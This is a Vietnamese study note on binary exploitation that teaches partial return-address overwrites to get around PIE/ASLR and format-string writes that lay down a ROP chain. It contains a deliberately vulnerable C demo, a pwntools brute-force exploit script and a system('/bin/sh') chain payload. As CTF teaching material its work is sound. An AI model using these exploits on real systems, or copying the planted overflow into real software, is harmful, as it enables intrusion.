# Partial overwrite & format-string → ROP (T4 lẻ)

> Tài liệu học sâu. Partial overwrite **verify bằng demo tự biên dịch** (trúng `win` ~1/16,
> pwntools 4.15). Nguồn ở cuối.

---

## 1. Partial overwrite — né leak bằng cách ghi 1–2 byte thấp

**Vấn đề:** PIE/ASLR làm địa chỉ random → thường phải **leak** mới biết `win`/gadget ở đâu.
**Mẹo:** địa chỉ trong **cùng một ảnh** (binary hoặc libc) chỉ khác nhau ở **byte thấp**; **byte
cao bị random giống nhau**. Nếu chỉ ghi đè **1–2 byte thấp** của return address, phần cao giữ
nguyên (vẫn đúng ảnh) → **chuyển hướng tới hàm gần đó mà KHÔNG cần leak**.

**Quy tắc bit (PIE):** base **căn trang** (`& 0xfff == 0`) → **12 bit thấp (0x000–0xfff) cố định**
(offset trong ảnh). Nên:
- Đích cách return-site **< 0x1000** → ghi **1 byte** (chắc ăn, không brute).
- Cách **< 0x10000** → ghi **2 byte**, nibble bit12–15 bị random → **brute 1/16**.

---

## 2. Writeup demo (verify)

```c
// po.c — gcc -fno-stack-protector po.c -o po   (PIE mặc định)
void win(){ puts("PWNED"); }                 // (nếu win gọi system -> nhớ căn lề movaps)
void vuln(){ char buf[0x20]; read(0, buf, 0x2a); }   // 0x2a = 0x28 tới ret + 2 byte
int main(){ setbuf(stdout,0); vuln(); }
```
Return-site = `main+0x1202`, `win = +0x1189` → chỉ khác **2 byte thấp**.

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *
context.binary = exe = ELF("./po", checksec=False)

OFF = 40                         # buf 0x20 + saved rbp 8
low = exe.sym.win & 0xffff       # 0x1189

while True:                      # brute nibble bit12-15 (~1/16)
    p = start()
    p.send(b"A"*OFF + p16(low))  # ghi ĐÈ 2 byte thấp ret = low16(win), giữ nguyên byte cao
    try:
        if b"PWNED" in p.recv(timeout=0.3):
            p.interactive(); break
    except EOFError: pass
    p.close()
```
**Verify:** trúng `win` sau vài lần (demo: lần 4). Khi đích & return-site **cùng trang** → ghi 1
byte, **không cần brute**.

**Lưu ý:**
- Chỉ ghi **byte thấp**, đừng đụng byte cao (giữ đúng ảnh). `read` phải **không thêm `\n`** vào
  giữa (dùng `send`, không `sendline`).
- Nếu `win` gọi `system` → vẫn cần **căn lề 16-byte** (xem [stack_pivot.md §5](stack_pivot.md#5-hai-cạm-bẫy-đều-verify-được-trên-demo)).
- Xác suất phụ thuộc số nibble random: 1 byte→chắc, 2 byte→1/16, 1.5 byte (3 nibble, hiếm)→1/4096.
  Bọc vòng brute trong [`retry/`](../../exploits/pwn/retry/).

---

## 3. Format-string → ROP

Khi fmt bug cho **arbitrary write** (`%n`) nhưng không có GOT/hàm tiện để nhảy, dùng fmt để **ghi
nguyên một ROP chain lên stack** (đè dãy return address), rồi để hàm return chạy chain.

- Ghi **từng địa chỉ** của chain vào các ô `saved_rip, saved_rip+8, …` bằng `fmtstr_payload` với
  **nhiều cặp** `{addr: val}` (write_size='short'/'byte' để pad nhỏ).
- Hoặc fmt ghi `ret addr` = gadget đầu (pop rdi…), rồi nếu còn lượt fmt, ghi tiếp.
```python
# ghi 3 ô ret liên tiếp = pop_rdi ; binsh ; system  (cần biết địa chỉ stack ret)
writes = {ret_slot: pop_rdi, ret_slot+8: binsh, ret_slot+16: libc.sym.system}
payload = fmtstr_payload(OFFSET, writes, write_size='short')
```
Thực tế thường **leak stack qua chính fmt** (`%p`) để biết `ret_slot`, rồi mới ghi. Chi tiết fmt:
[fmtstr.md](fmtstr.md), API: [fmt.md](pwntools/fmt.md). Khác với fmt→GOT (đè 1 ô): fmt→ROP đè
**cả chuỗi ret** nên cần **nhiều lần ghi** hoặc payload dài — cân nhắc đè GOT/`__malloc_hook` cho gọn.

---

## 4. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **demo §2** | ⭐⭐ | partial overwrite + brute nibble | verify trúng win |
| **ir0nstone — ASLR/partial overwrite** | ⭐⭐ | lý thuyết + bài | <https://ir0nstone.gitbook.io/notes/binexp/stack/aslr> |
| **`fsb/FSB_Other_Format_Techniques`** (local) | ⭐⭐⭐ | fmt→ghi nâng cao | kết hợp [fmtstr.md](fmtstr.md) |
| **fmt→ROP trên bài 1-shot fmt** | ⭐⭐⭐ | ghi cả chain bằng %n | leak stack bằng %p trước |

**Lộ trình:** partial overwrite 1 byte (không brute) → 2 byte (brute 1/16) → fmt→GOT → fmt→ROP.

---

## Nguồn tham khảo

- ir0nstone — *ASLR / partial overwrite*: <https://ir0nstone.gitbook.io/notes/binexp/stack/aslr>
- fmt: [fmtstr.md](fmtstr.md), [pwntools/fmt.md](pwntools/fmt.md); brute: [`retry/`](../../exploits/pwn/retry/)
